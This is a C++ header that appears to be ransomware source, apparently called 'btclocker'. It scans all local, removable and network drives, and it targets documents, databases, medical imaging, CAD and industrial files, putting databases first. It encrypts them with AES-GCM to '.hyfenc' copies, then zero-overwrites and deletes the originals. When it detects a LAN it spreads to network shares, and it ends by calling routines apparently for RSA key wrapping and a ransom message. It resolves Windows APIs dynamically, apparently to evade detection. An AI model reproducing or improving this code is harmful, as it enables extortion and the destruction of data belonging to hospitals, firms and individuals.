        fs::path keyPath = fs::path(docsPath) / fileName;
        fs::create_directories(keyPath.parent_path());

        std::ofstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            std::cerr << "Cannot create key file: " << keyPath << std::endl;
            SAFE_CALL_API(pCoTaskMemFree, docsPath);
            return false;
        }

        keyFile.write(reinterpret_cast<const char*>(key), length);
        keyFile.close();

        if (!keyFile.good()) {
            std::cerr << "Write to key file failed" << std::endl;
            SAFE_CALL_API(pCoTaskMemFree, docsPath);
            return false;
        }

        DWORD attrs = SAFE_CALL_API(pGetFileAttributesW, keyPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            SAFE_CALL_API(pSetFileAttributesW, keyPath.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
        }

        std::cout << "GCM encryption key saved to: " << keyPath << std::endl;
        SAFE_CALL_API(pCoTaskMemFree, docsPath);
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "SaveKeyToDocuments error: " << e.what() << std::endl;
        return false;
    }
}

inline fs::path GetUserDocumentsPath() {
    PWSTR path = nullptr;
    HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &path);

    if (SUCCEEDED(hr) && path != nullptr) {
        fs::path result(path);
        SAFE_CALL_API(pCoTaskMemFree, path);
        return result;
    }

    std::cerr << "Warning: Cannot get documents folder, using current directory" << std::endl;
    return fs::current_path();
}

inline bool IsAesNiSupported() {
    int cpuInfo[4] = { 0 };

    __try {
        __cpuid(cpuInfo, 0);

        // 检查最大功能号
        if (cpuInfo[0] < 1) {
            return false;
        }

        __cpuid(cpuInfo, 1);

        // 检查AES-NI支持 (bit 25 of ECX)
        bool aesniSupported = (cpuInfo[2] & (1 << 25)) != 0;

        // 检查OSXSAVE支持 (bit 27 of ECX) - 用于AVX和更高版本
        bool osxsaveSupported = (cpuInfo[2] & (1 << 27)) != 0;

        if (aesniSupported && osxsaveSupported) {
            // 检查XGETBV支持
            uint64_t xcr0 = _xgetbv(0);
            // 检查XMM和YMM状态支持
            bool xmmYmmSupported = (xcr0 & 0x6) == 0x6;

            return xmmYmmSupported;
        }

        return aesniSupported;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
}

inline bool isFileLocked(const fs::path& filePath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;

    try {
        hFile = SAFE_CALL_API(pCreateFileW,
            filePath.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            return (error == ERROR_SHARING_VIOLATION ||
                error == ERROR_LOCK_VIOLATION ||
                error == ERROR_ACCESS_DENIED);
        }

        SAFE_CALL_API(pCloseHandle, hFile);
        return false;
    }
    catch (...) {
        if (hFile != INVALID_HANDLE_VALUE) {
            SAFE_CALL_API(pCloseHandle, hFile);
        }
        return true;
    }
}

// ==================== 安全删除相关函数 ====================
inline bool SecureDeleteFilehf(const fs::path& filePath, int maxRetries) {
    for (int attempt = 0; attempt < maxRetries; ++attempt) {
        HANDLE hFile = INVALID_HANDLE_VALUE;

        try {
            std::cout << "SecureDeleteFilehf attempt " << (attempt + 1) << " for: " << filePath << std::endl;

            // 检查加密副本是否存在
            fs::path encryptedFile = filePath;
            encryptedFile += ".hyfenc";

            if (!fs::exists(encryptedFile)) {
                std::cerr << "Encrypted file not found, skipping deletion: " << filePath << std::endl;
                return false;
            }

            // 验证加密文件的有效性
            if (!validateEncryptedFile(encryptedFile, filePath)) {
                std::cerr << "Encrypted file validation failed, skipping deletion: " << filePath << std::endl;
                return false;
            }

            if (!fs::exists(filePath)) {
                std::cout << "File not found, deletion successful: " << filePath << std::endl;
                return true;
            }

            std::error_code ec;
            if (fs::remove(filePath, ec)) {
                std::cout << "Simple deletion successful: " << filePath << std::endl;
                return true;
            }

            hFile = SAFE_CALL_API(pCreateFileW,
                filePath.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                DWORD error = GetLastError();
                std::cerr << "Cannot open file for secure deletion (error " << error << "): " << filePath << std::endl;

                if (attempt == maxRetries - 1) {
                    std::error_code ec2;
                    return fs::remove(filePath, ec2);
                }
                continue;
            }

            LARGE_INTEGER fileSize;
            if (!SAFE_CALL_API(pGetFileSizeEx, hFile, &fileSize)) {
                SAFE_CALL_API(pCloseHandle, hFile);
                std::cerr << "Cannot get file size: " << filePath << std::endl;
                continue;
            }

            if (fileSize.QuadPart == 0) {
                SAFE_CALL_API(pCloseHandle, hFile);
                std::error_code ec3;
                bool result = fs::remove(filePath, ec3);
                std::cout << "Empty file deleted: " << filePath << " - " << (result ? "success" : "failed") << std::endl;
                return result;
            }

            std::vector<BYTE> zeroBuffer(64 * 1024, 0);
            LARGE_INTEGER offset = { 0 };
            LONGLONG remaining = fileSize.QuadPart;

            while (remaining > 0) {
                DWORD toWrite = static_cast<DWORD>(std::min(static_cast<LONGLONG>(zeroBuffer.size()), remaining));
                DWORD written = 0;

                if (!SAFE_CALL_API(pSetFilePointerEx, hFile, offset, NULL, FILE_BEGIN) ||
                    !SAFE_CALL_API(pWriteFile, hFile, zeroBuffer.data(), toWrite, &written, NULL)) {
                    DWORD error = GetLastError();
                    std::cerr << "Write failed at offset " << offset.QuadPart << " (error " << error << ")" << std::endl;
                    SAFE_CALL_API(pCloseHandle, hFile);
                    throw std::runtime_error("Write failed during secure deletion");
                }

                offset.QuadPart += toWrite;
                remaining -= toWrite;
            }

            SAFE_CALL_API(pFlushFileBuffers, hFile);
            SAFE_CALL_API(pCloseHandle, hFile);

            std::error_code ec4;
            bool finalResult = fs::remove(filePath, ec4);
            std::cout << "Secure deletion completed: " << filePath << " - " << (finalResult ? "success" : "failed") << std::endl;
            return finalResult;

        }
        catch (const std::exception& e) {
            if (hFile != INVALID_HANDLE_VALUE) {
                SAFE_CALL_API(pCloseHandle, hFile);
            }
            std::cerr << "SecureDeleteFilehf exception (attempt " << (attempt + 1) << "): " << e.what() << std::endl;

            if (attempt == maxRetries - 1) {
                std::error_code ec;
                return fs::remove(filePath, ec);
            }
            Sleep(1000);
        }
    }
    return false;
}

inline bool validateEncryptedFile(const fs::path& encryptedFile, const fs::path& originalFile) {
    try {
        if (!fs::exists(encryptedFile)) {
            std::cerr << "Encrypted file not found: " << encryptedFile << std::endl;
            return false;
        }

        uintmax_t encryptedSize = fs::file_size(encryptedFile);
        uintmax_t originalSize = fs::file_size(originalFile);

        uintmax_t minExpectedSize = originalSize + IV_LENGTH + TAG_LENGTH;

        if (encryptedSize < minExpectedSize) {
            std::cerr << "Encrypted file too small: " << encryptedFile
                << " (expected: " << minExpectedSize << ", actual: " << encryptedSize << ")" << std::endl;
            return false;
        }

        if (!validateFileHeader(encryptedFile)) {
            std::cerr << "Invalid file header: " << encryptedFile << std::endl;
            return false;
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Encrypted file validation error: " << e.what() << std::endl;
        return false;
    }
}

inline bool validateFileHeader(const fs::path& encryptedFile) {
    try {
        std::ifstream file(encryptedFile, std::ios::binary);
        if (!file) return false;

        BYTE iv[IV_LENGTH];
        if (!file.read(reinterpret_cast<char*>(iv), IV_LENGTH)) {
            return false;
        }

        for (DWORD i = 0; i < IV_LENGTH; ++i) {
            if (iv[i] != 0) {
                return true;
            }
        }

        return false;
    }
    catch (...) {
        return false;
    }
}

inline bool validateEncryptedFileStable(const fs::path& encryptedFile) {
    try {
        if (!fs::exists(encryptedFile)) {
            return false;
        }

        // 检查文件大小稳定性
        auto size1 = fs::file_size(encryptedFile);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        auto size2 = fs::file_size(encryptedFile);

        return size1 == size2 && validateFileHeader(encryptedFile);
    }
    catch (...) {
        return false;
    }
}

inline bool SecureDelete(const fs::path& path) {
    try {
        if (!fs::exists(path)) {
            return true;
        }

        if (fs::is_directory(path)) {
            for (const auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    fs::path encryptedFile = entry.path();
                    encryptedFile += ".hyfenc";

                    if (fs::exists(encryptedFile)) {
                        if (!validateEncryptedFile(encryptedFile, entry.path())) {
                            std::cerr << "Skipping deletion due to validation failure: " << entry.path() << std::endl;
                            continue;
                        }
                    }

                    if (!SecureDeleteFilehf(entry.path(), 3)) {
                        return false;
                    }
                }
            }
            return fs::remove_all(path) > 0;
        }

        fs::path encryptedFile = path;
        encryptedFile += ".hyfenc";

        if (fs::exists(encryptedFile)) {
            if (!validateEncryptedFile(encryptedFile, path)) {
                std::cerr << "Skipping deletion due to validation failure: " << path << std::endl;
                return false;
            }
        }

        return SecureDeleteFilehf(path, 3);
    }
    catch (const std::exception& e) {
        std::cerr << "SecureDelete error for " << path << ": " << e.what() << std::endl;
        return false;
    }
}

inline void SetConsoleChineseSupport() {
    SetConsoleOutputCP(65001);
    SetConsoleCP(65001);

    CONSOLE_FONT_INFOEX fontInfo;
    fontInfo.cbSize = sizeof(fontInfo);
    fontInfo.nFont = 0;
    fontInfo.dwFontSize.X = 0;
    fontInfo.dwFontSize.Y = 16;
    fontInfo.FontFamily = FF_DONTCARE;
    fontInfo.FontWeight = FW_NORMAL;
    wcscpy_s(fontInfo.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), FALSE, &fontInfo);
}
// ==================== 局域网环境检测函数 ====================

inline bool LoadKeyFromDocuments(BYTE* key, DWORD length, const std::wstring& fileName) {
    try {
        PWSTR docsPath = nullptr;
        HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &docsPath);

        if (SUCCEEDED(hr) && docsPath != nullptr) {
            fs::path keyPath = fs::path(docsPath) / fileName;
            SAFE_CALL_API(pCoTaskMemFree, docsPath);

            if (fs::exists(keyPath)) {
                std::ifstream keyFile(keyPath, std::ios::binary);
                if (keyFile) {
                    keyFile.read(reinterpret_cast<char*>(key), length);
                    if (keyFile.gcount() == length) {
                        std::cout << "Key loaded from documents: " << keyPath << std::endl;
                        return true;
                    }
                }
            }
        }

        fs::path currentKeyPath = fs::current_path() / fileName;
        if (fs::exists(currentKeyPath)) {
            std::ifstream keyFile(currentKeyPath, std::ios::binary);
            if (keyFile) {
                keyFile.read(reinterpret_cast<char*>(key), length);
                if (keyFile.gcount() == length) {
                    std::cout << "Key loaded from current directory: " << currentKeyPath << std::endl;
                    return true;
                }
            }
        }

        std::cerr << "Key file not found in documents or current directory" << std::endl;
        return false;

    }
    catch (const std::exception& e) {
        std::cerr << "LoadKeyFromDocuments error: " << e.what() << std::endl;
        return false;
    }
}
inline bool canAccessDrive(const fs::path& drive) {
    DWORD attributes = GetFileAttributesW(drive.c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "Cannot access drive: " << drive << " (Error: " << GetLastError() << ")" << std::endl;
        return false;
    }

    // 尝试读取磁盘根目录
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((drive.wstring() + L"*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "Cannot list files on drive: " << drive << " (Error: " << GetLastError() << ")" << std::endl;
        return false;
    }
    FindClose(hFind);
    return true;
}

// 获取所有磁盘驱动器
// 获取所有磁盘驱动器（包括可移动设备）
inline std::vector<fs::path> getAllDrives() {
    std::vector<fs::path> drives;
    DWORD driveMask = GetLogicalDrives();

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (driveMask & 1) {
            std::string rootPath = std::string(1, drive) + ":\\";
            DWORD driveType = GetDriveTypeA(rootPath.c_str());

            // 修改：包含所有可访问的磁盘类型
            switch (driveType) {
            case DRIVE_FIXED:      // 本地硬盘
            case DRIVE_REMOTE:     // 网络驱动器
            case DRIVE_REMOVABLE:  // U盘/移动硬盘（新增）
            case DRIVE_RAMDISK:    // 内存磁盘（新增）
                if (canAccessDrive(fs::path(rootPath))) {
                    drives.push_back(fs::path(rootPath));
                    std::cout << "Including drive " << rootPath << " (Type: ";
                    switch (driveType) {
                    case DRIVE_FIXED: std::cout << "Fixed"; break;
                    case DRIVE_REMOTE: std::cout << "Remote"; break;
                    case DRIVE_REMOVABLE: std::cout << "Removable"; break;
                    case DRIVE_RAMDISK: std::cout << "RAM Disk"; break;
                    }
                    std::cout << ")" << std::endl;
                }
                break;

            case DRIVE_CDROM:      // 光盘（通常只读，跳过）
            case DRIVE_UNKNOWN:     // 未知类型（跳过）
            case DRIVE_NO_ROOT_DIR: // 无效目录（跳过）
            default:
                std::cout << "Skipping drive " << rootPath << " (Type: ";
                switch (driveType) {
                case DRIVE_CDROM: std::cout << "CD-ROM"; break;
                case DRIVE_UNKNOWN: std::cout << "Unknown"; break;
                case DRIVE_NO_ROOT_DIR: std::cout << "No Root Dir"; break;
                default: std::cout << "Other"; break;
                }
                std::cout << ")" << std::endl;
                break;
            }
        }
        driveMask >>= 1;
    }
    return drives;
}

// 检查磁盘访问权限
// ==================== 优化后的主加密函数 ====================
// ==================== 优化后的主加密函数 ====================
// ==================== 优化后的主加密函数 ====================
inline int encrypthf_optimized() {
    try {
        SetConsoleChineseSupport();

        if (!g_DynamicAPIInitializer.IsInitialized()) {
            std::cerr << "Failed to initialize dynamic APIs" << std::endl;
            return 1;
        }

        std::cout << "=== Optimized Ultimate Encryption Pipeline Started (GCM Mode + Network Scan) ===" << std::endl;

        // 初始化配置管理器
        RuntimeConfigManager& config = RuntimeConfigManager::getInstance();
        config.loadConfig();

        bool hwAccelSupported = IsAesNiSupported();
        std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

        if (!hwAccelSupported) {
            std::cout << "Warning: Hardware acceleration (AES-NI) not detected. "
                << "Encryption will be performed in software mode, which may be slower." << std::endl;
        }

        BYTE encryptionKey[KEY_LENGTH];
        GenerateRandomKey(encryptionKey, KEY_LENGTH);

        std::cout << "Saving encryption key to documents directory..." << std::endl;

        PWSTR docsPath = nullptr;
        HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &docsPath);
        bool keySaved = false;

        if (SUCCEEDED(hr) && docsPath != nullptr) {
            fs::path keyPath = fs::path(docsPath) / L"btclocker_key.bin";
            std::cout << "Key path: " << keyPath << std::endl;

            fs::create_directories(keyPath.parent_path());

            std::ofstream keyFile(keyPath, std::ios::binary);
            if (keyFile) {
                keyFile.write(reinterpret_cast<const char*>(encryptionKey), KEY_LENGTH);
                keyFile.close();

                if (fs::exists(keyPath)) {
                    DWORD attrs = SAFE_CALL_API(pGetFileAttributesW, keyPath.c_str());
                    if (attrs != INVALID_FILE_ATTRIBUTES) {
                        SAFE_CALL_API(pSetFileAttributesW, keyPath.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
                    }
                    std::cout << "Key saved to documents directory: " << keyPath << std::endl;
                    keySaved = true;
                }
            }
            SAFE_CALL_API(pCoTaskMemFree, docsPath);
        }

        if (!keySaved) {
            std::cerr << "Failed to save key to documents directory, trying current directory..." << std::endl;
            fs::path currentKeyPath = fs::current_path() / "btclocker_key.bin";
            std::ofstream altKeyFile(currentKeyPath, std::ios::binary);
            if (altKeyFile) {
                altKeyFile.write(reinterpret_cast<const char*>(encryptionKey), KEY_LENGTH);
                altKeyFile.close();
                if (fs::exists(currentKeyPath)) {
                    std::cout << "Key saved to current directory: " << currentKeyPath << std::endl;
                    keySaved = true;
                }
            }
        }

        if (!keySaved) {
            std::cerr << "Critical: All key save attempts failed!" << std::endl;
            std::cerr << "Key will only be available in memory during this session." << std::endl;
        }

        std::this_thread::sleep_for(std::chrono::seconds(2));

        // === 阶段1: 本地文件加密 ===
        std::cout << "\n=== Phase 1: Local File Encryption ===" << std::endl;

        // 关键修改：使用shared_ptr而不是unique_ptr
        auto pipelineController = std::make_shared<OptimizedEncryptionPipeline::OptimizedPipelineController>();
        if (!pipelineController->initializePipeline(encryptionKey)) {
            std::cerr << "Failed to initialize optimized encryption pipeline" << std::endl;
            return 1;
        }

        // 使用原子变量和互斥锁进行线程安全计数
        std::atomic<size_t> totalFiles{ 0 };
        std::atomic<size_t> dbFileCount{ 0 };
        std::atomic<size_t> otherFileCount{ 0 };
        std::atomic<size_t> skippedFiles{ 0 };
        std::mutex scanMutex;

        static const std::vector<std::wstring> systemPatterns = {
            L"WindowsApps", L"Windows", L"System32", L"$Recycle.Bin",
            L"ProgramData\\Microsoft\\Windows", L"AppData", L"Temp",
            L"Temporary Internet Files", L"WinSxS", L"DriverStore",
            L"Assembly", L"Microsoft.NET", L"ServiceProfiles",
            L"System Volume Information"
        };

        static const std::unordered_set<std::string> databaseExtensions = {
          ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
          ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
          ".backup", ".wal", ".journal", ".dat", ".bin",

          // === 新增：医疗数据库文件 ===
          ".hl7", ".x12", ".ccd", ".ccr", ".cda", ".fhir", ".dicoman", ".phr",

          // === 新增：工程数据库文件 ===
          ".prt", ".asm", ".drw", ".frm", ".lay"
        };

        std::vector<std::string> extensions = {
      ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
      ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
      ".qbb", ".qbo", ".ofx",
      ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
      ".psd", ".ai", ".dwg", ".skp",
      ".vmdk", ".iso", ".pfx", ".pems",
      ".pst", ".mbox", ".mpp",
      ".jar", ".zip", ".tar.gz",
      ".ppt", ".jpg", ".png", ".txtx", ".jpeg",

      // === 新增：设计图纸和CAD文件 ===
      ".dxf", ".dgn", ".stl", ".step", ".stp", ".iges", ".igs",
      ".ipt", ".iam", ".prt", ".asm", ".catpart", ".catproduct",
      ".sldprt", ".sldasm", ".slddrw", ".3ds", ".max", ".obj", ".fbx",
      ".blend", ".mb", ".ma", ".c4d", ".ztl", ".3dm", ".rhino",

      // === 新增：医院和医疗文件 ===
      ".dicom", ".dcm", ".nii", ".nii.gz", ".mgh", ".mgz", ".img", ".hdr",
      ".ima", ".vox", ".analyze", ".mnc", ".mosaic", ".pic", ".bshort", ".bfloat",
      ".spr", ".eeg", ".edf", ".bdf", ".fif", ".set", ".cnt", ".vmrk", ".vhdr",
      ".ecg", ".emg", ".xry", ".ct", ".mri", ".pet", ".spect",

      // === 新增：工业生产文件 ===
      ".nc", ".cnc", ".gcode", ".tap", ".apt", ".cl", ".plt", ".hpgl", ".hp",
      ".cam", ".prg", ".mpf", ".mmg", ".dmis", ".cmm", ".xyz", ".pointcloud",
      ".pcd", ".las", ".laz", ".3d", ".asc", ".pts", ".ptx", ".e57", ".fls",
      ".sdc", ".rpc", ".rpl", ".rpl2", ".rpl3", ".rpl4", ".rpl5", ".rpl6",

      // === 新增：工程和制造文件 ===
      ".plm", ".plmx", ".prt", ".asm", ".drw", ".frm", ".lay", ".idw", ".ipj",
      ".iam", ".ipt", ".neu", ".unv", ".cdb", ".rst", ".rth", ".rst", ".full",
      ".dat", ".inp", ".mac", ".ses", ".cdb", ".cbd", ".cax", ".model",

      // === 新增：建筑和BIM文件 ===
      ".rvt", ".rfa", ".rte", ".adsk", ".ifc", ".ifczip", ".dgn", ".dwg",
      ".plt", ".ctb", ".stb", ".pc3", ".pm3", ".dst", ".dsz",

      // === 新增：科研数据文件 ===
      ".fits", ".fit", ".sdf", ".mol", ".mol2", ".pdb", ".cif", ".ent", ".xyz",
      ".log", ".com", ".gjf", ".inp", ".out", ".chk", ".fchk", ".wfn", ".wfx"
        };


        // 获取所有磁盘驱动器
        std::vector<fs::path> targetDirectories = getAllDrives();
        std::cout << "Scanning all available drives..." << std::endl;
        std::cout << "Found " << targetDirectories.size() << " drives to scan" << std::endl;
        std::cout << "Target extensions: " << extensions.size() << " types" << std::endl;

        std::cout << "\nStarting optimized parallel drive scan..." << std::endl;

        // ========== 修改后的并行扫描代码 ==========
        // 遍历所有磁盘
        for (const auto& targetDirectory : targetDirectories) {
            std::cout << "Scanning drive: " << targetDirectory << std::endl;

            try {
                // 修复1：收集所有要扫描的目录（包括根目录和所有子目录）
                std::vector<fs::path> allScanPaths;

                // 始终包含根目录
                allScanPaths.push_back(targetDirectory);

                // 修复2：递归获取所有子目录
                std::function<void(const fs::path&)> collectSubdirs;
                collectSubdirs = [&](const fs::path& dir) {
                    try {
                        for (const auto& entry : fs::directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
                            if (entry.is_directory()) {
                                allScanPaths.push_back(entry.path());
                                collectSubdirs(entry.path()); // 递归收集
                            }
                        }
                    }
                    catch (const fs::filesystem_error&) {
                        // 忽略权限错误，继续扫描其他目录
                    }
                    };

                // 收集所有子目录
                collectSubdirs(targetDirectory);

                std::cout << "Found " << allScanPaths.size() << " directories to scan on drive " << targetDirectory << std::endl;

                // 并行扫描所有目录（限制并发数）
                const size_t maxConcurrentScans = std::max(1u, std::thread::hardware_concurrency() * 4);
                std::vector<std::future<void>> scanFutures;

                for (size_t i = 0; i < allScanPaths.size(); i += maxConcurrentScans) {
                    auto start = allScanPaths.begin() + i;
                    auto end = i + maxConcurrentScans < allScanPaths.size() ?
                        start + maxConcurrentScans : allScanPaths.end();

                    // 为每个目录组创建异步扫描任务
                    for (auto it = start; it != end; ++it) {
                        scanFutures.push_back(std::async(std::launch::async, [&, path = *it]() {
                            try {
                                for (const auto& entry : fs::directory_iterator(
                                    path, fs::directory_options::skip_permission_denied)) {

                                    if (!entry.is_regular_file()) continue;

                                    // 检查是否为密钥文件
                                    if (entry.path().filename() == "btclocker_key.bin" ||
                                        entry.path().filename() == L"btclocker_key.bin") {
                                        continue;
                                    }

                                    std::wstring filePath = entry.path().wstring();
                                    bool isSystemFile = false;
                                    for (const auto& pattern : systemPatterns) {
                                        if (filePath.find(pattern) != std::wstring::npos) {
                                            isSystemFile = true;
                                            skippedFiles.fetch_add(1);
                                            break;
                                        }
                                    }

                                    if (isSystemFile) {
                                        continue;
                                    }

                                    if (isFileLocked(entry.path())) {
                                        std::cout << "File is locked by another process, skipping: " << entry.path() << std::endl;
                                        skippedFiles.fetch_add(1);
                                        continue;
                                    }

                                    std::string ext = entry.path().extension().string();
                                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                                    bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                                        [&](const std::string& targetExt) {
                                            std::string lowerTarget = targetExt;
                                            std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                                            return ext == lowerTarget;
                                        });

                                    if (shouldEncrypt) {
                                        fs::path outputFile = entry.path();
                                        outputFile += ".hyfenc";

                                        if (fs::exists(outputFile)) {
                                            std::cout << "Output file already exists, skipping: " << outputFile << std::endl;
                                            continue;
                                        }

                                        bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
                                        int priority = isDatabaseFile ? 1000 : 0;

                                        // 使用互斥锁保护pipelineController调用
                                        {
                                            std::lock_guard<std::mutex> lock(scanMutex);
                                            pipelineController->addEncryptionTask(entry.path(), outputFile, priority);
                                        }

                                        if (isDatabaseFile) {
                                            dbFileCount.fetch_add(1);
                                        }
                                        else {
                                            otherFileCount.fetch_add(1);
                                        }
                                        totalFiles.fetch_add(1);

                                        if (totalFiles.load() % 100 == 0) {
                                            std::cout << "Added " << totalFiles.load() << " files to encryption queue..." << std::endl;
                                        }
                                    }
                                }
                            }
                            catch (const std::exception& e) {
                                std::lock_guard<std::mutex> lock(scanMutex);
                                std::cerr << "Error scanning directory " << path << ": " << e.what() << std::endl;
                            }
                            }));
                    }

                    // 等待当前批次完成
                    for (auto& future : scanFutures) {
                        future.wait();
                    }
                    scanFutures.clear();
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Error scanning drive " << targetDirectory << ": " << e.what() << std::endl;
                continue;
            }
        }
        // ========== 并行扫描代码结束 ==========

        std::cout << "Parallel scan completed. Found " << totalFiles.load() << " files to encrypt." << std::endl;
        std::cout << "  Database files: " << dbFileCount.load() << std::endl;
        std::cout << "  Other files: " << otherFileCount.load() << std::endl;
        std::cout << "  Skipped files: " << skippedFiles.load() << std::endl;
      
        if (totalFiles.load() == 0) {
            std::cout << "No local files to encrypt." << std::endl;
        }
        else {
            std::cout << "\nWaiting for local encryption to complete..." << std::endl;
            pipelineController->waitForCompletion(true); // 保持管道活动
            std::cout << "\n=== Phase 1 Complete: Local Encryption Finished ===" << std::endl;
        }

        // === 新增: 局域网环境检测 ===
        std::cout << "\n=== Network Environment Detection ===" << std::endl;

        bool isInLAN = IsInLANEnvironment();

        if (isInLAN) {
            // === 阶段2: 网络扫描和加密 ===
            std::cout << "\n=== Phase 2: Network Share Scanning and Encryption ===" << std::endl;

            std::cout << "Initializing network scanning module..." << std::endl;

            // 关键修改：直接传递shared_ptr，不需要类型转换
            network_scanner::SetPipelineController(pipelineController);
            network_scanner::StartScan(
                std::reinterpret_pointer_cast<encryption_pipeline::PipelineController>(pipelineController),
                true
            );

            std::cout << "\n=== Phase 2 Complete: Network Scan Finished ===" << std::endl;
        }
        else {
            std::cout << "\n⚠️ 未检测到局域网环境，跳过网络扫描阶段" << std::endl;
            std::cout << "直接进入后续处理流程..." << std::endl;
        }

        // === 最终阶段: 等待所有任务完成 ===
        std::cout << "\n=== Final Phase: Waiting for All Encryption Tasks ===" << std::endl;

        // 等待所有任务完成（包括网络加密任务）
        pipelineController->waitForCompletion(false); // 最终关闭

        std::cout << "\n=== All Encryption Tasks Completed ===" << std::endl;

        // 统一的性能统计和资源清理
        pipelineController->shutdownPipeline();

        // 后续处理保持不变
        rsaencrypt();
        showtext();

        std::cout << "==========================================" << std::endl;
        std::cout << "Complete Local + Network Encryption Tool Finished Successfully." << std::endl;

        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
        return 1;
    }
}
// ==================== 兼容性包装函数 ====================
inline int encrypthf() {
    // 使用优化版本
    return encrypthf_optimized();
}

#endif // TEX_H